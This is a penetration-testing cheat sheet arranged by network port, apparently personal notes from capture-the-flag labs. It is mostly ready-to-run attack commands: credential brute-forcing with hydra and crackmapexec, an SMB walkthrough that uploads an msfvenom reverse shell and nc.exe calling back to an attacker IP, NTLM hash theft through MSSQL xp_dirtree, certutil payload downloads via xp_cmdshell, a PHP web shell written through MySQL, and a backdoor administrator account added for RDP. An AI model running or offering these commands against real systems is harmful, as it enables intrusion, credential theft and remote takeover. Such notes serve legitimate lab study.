## 21 - FTP:
## 22 - SSH:
## 25 - SMTP:
## 53 - DNS:
## 79 - Finger:
## 80/443 - HTTP/HTTPS:
## 88 - Kerberos:
## 110 - POP3:
## 139/445 - SMB:
    ***nmap -script smb-vuln* -script-args=unsafe=1 -p139,445 <IP>
    **sniff SMB version:  sudo ngrep -i -d <interface> 's.?a.?m.?b.?a*[[:digit:]]' port 139  ;  smbclient -L <IP>  \\  Or MSF:  use auxiliary/scanner/smb/smb_version
    View Shares:  smbmap -H <IP>  \\  smbclient -L <IP>
    Enumerate:  enum4linux [-a] <IP>
    Brute Force:  hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
    Connect:  Anonymous: smbclient //$ip/share -N  \\  smbclient \\\\$ip\\$share [-U <user>]  \\  smbclient -L <IP> -U administrator  (or anonymous)
        Commands:  help, get, put, etc.
    Null session with rpcclient (MS-RPC) for legacy samba or SMB:  rpcclient -U "" [target IP address]  ;  enumdomusers
    Exploitation Example:
        Connect, Upload and get shell via web:
        (1: initial, unstable shell)
        msfvenom -p php/reverse_php LHOST=10.10.14.18 LPORT=4444 -o rev.php
        smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put rev.php'
        go to in browser       
        (2: switch to stable shell w/ nc)
        smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /usr/share/windows-resources/binaries/nc.exe nc.exe'
        ##smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /home/rowan/Desktop/websharing/simplephpwebshell.php cmd.php'
        in first shell: nc.exe 10.10.14.18 4445 -e cmd.exe
## 161 - SNMP:
    Probe with snmpwalk if we know the community string (often is 'public'):
        mib tree:   snmpwalk -c public -v1 -t 10 10.11.1.14
        windows users:   snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
        running windows processes:  snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
        installed software:   snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
    Brute Force Community String:  onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
    Enumerate:  snmpwalk -c public -v 1 10.10.10.116  \\  snmpwalk -v3 -l authNoPriv -u authOnlyUser -a MD5 -A MyPassword123 192.168.1.2  \\  snmp-check 192.168.1.2 -c public
    **Enumerate: https://github.com/dheiland-r7/snmp:
        perl snmpbw.pl 10.10.10.241 public 2 4 
## 389 - LDAP:
    Scans:  nmap -n -sV --script "ldap* and not brute"
    ldapsearch -h <IP> -x -s base
    ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
    GUI:  jxplorer
## 1433 - MSSQL:
    Scan:  nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
    Brute Force:  hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
    With Creds:
        mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
        mssqlclient.py <USER>:<PASSWORD>@<IP>
        # Once logged in you can run queries:
        SQL> select @@ version;
        # Steal NTLM hash
        sudo smbserver.py -smb2support liodeus .
        SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
        # Try to enable code execution
        SQL> enable_xp_cmdshell
        # Execute code
        SQL> xp_cmdshell whoami /all
        SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
## 2049 - NFS:
    View Shares:  showmount -e <IP>
    Mount Share Locally:  sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
    View Exported Shares:  cat /etc/exports
    Privesc: look for no_root_squash/no_all_squash
## 3306 - MYSQL:
    Brute Force:  hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
    Local Connect:  mysql -u <user> -p <password> [-e 'show databases;'  \\  -e 'use drupal; show tables; select * from users;']
        IF MYSQL LOCAL LOGIN DOESN'T WORK, USE MYSQLDUMP (or look for other mysql programs on box) (or use tool like Chisel):
            mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
        Setup local mysql database to connect to w/ adminer:  https://0xdf.gitlab.io/2020/09/26/htb-admirer.html
    Remote Connect:  mysql -h <IP> -u <USER>
    Commands:
        show databases;
        use <DATABASES>;
        show tables;
        describe <TABLE>;
        select * from <TABLE>;
        # Try to execute code
        select do_system('id');
        \! sh
        # Read & Write
        select load_file('<FILE>');
        select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
## 3389 - RDP:
    RDP port 3389 login:   rdesktop [-d <DOMAIN>] -u <USERNAME> [-p <PASS>] <IP>  \\  xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP> +clipboard  \\  xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
    Brute Force:  crowbar -b rdp -s <IP>/CIDR [-u <USER>  \\  -U <USERLIST>] -C <PASSWORDS_LIST>  \\  hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
    Add RDP User (Windows):  net user <user> <pass> /add; net localgroup "Administrators" <USER> /add; net localgroup "Remote Desktop Users" <USER> /add
## 3690 - SVN Server:
        svn info svn://10.10.10.203
        svn list svn://10.10.10.203
        svn export svn://10.10.10.203/moved.txt
        svn export svn://10.10.10.203/dimension.worker.htb/,  svn checkout -r 1 svn://worker.htb,  svn checkout -r 2 svn://worker.htb
## 5800/5900/5901/58001 - VNC:
    Scan:  nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
    Brute Force:  hydra -L <USERS_LIST> â€“P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
    Connect:  vncviewer <IP>:<PORT>
    Default Password Locations:
        Linux: Default password is stored in: ~/.vnc/passwd
        Windows:
            # RealVNC:  HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
            # TightVNC:  HKEY_CURRENT_USER\Software\TightVNC\Server
            # TigerVNC:  HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
            # UltraVNC:  C:\Program Files\UltraVNC\ultravnc.ini
## 5985/5986 - WINRM:
    Brute Force:  crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
    Connect:  evil-winrm -i <IP> -u <USER> -p <PASSWORD>  \\  evil-winrm -i <IP> -u <USER> -H <HASH>
